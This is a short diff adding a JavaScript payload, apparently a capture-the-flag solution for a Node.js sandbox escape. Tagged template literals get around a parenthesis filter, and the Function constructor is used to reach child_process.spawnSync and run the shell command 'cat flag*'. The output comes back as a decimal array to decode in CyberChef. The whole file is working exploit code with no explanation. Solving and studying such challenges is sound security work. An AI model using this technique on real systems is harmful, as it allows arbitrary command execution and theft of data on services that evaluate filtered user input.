@@ -1,0 +1,4 @@
+Object[`assign`][`bind`]`${global}``${{chararray:``[`constructor`][`constructor`][`toString`]``[`split`]``}}`
+chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;chararray[`shift`]``;
+Object[`assign`][`bind`]`${global}``${{open_parenthesis:chararray[`shift`]``,close_parenthesis:chararray[`shift`]``}}`
+console[`log`]`${``[`constructor`][`constructor`]`_${`return process[\`mainModule\`][\`require\`]${open_parenthesis}\`child_process\`${close_parenthesis}[\`spawnSync\`]${open_parenthesis}\`cat flag*\`,[],{shell:true}${close_parenthesis}[\`stdout\`]`}```[`join`]`,`}Decode the decimal array using cyberchef >>>`;
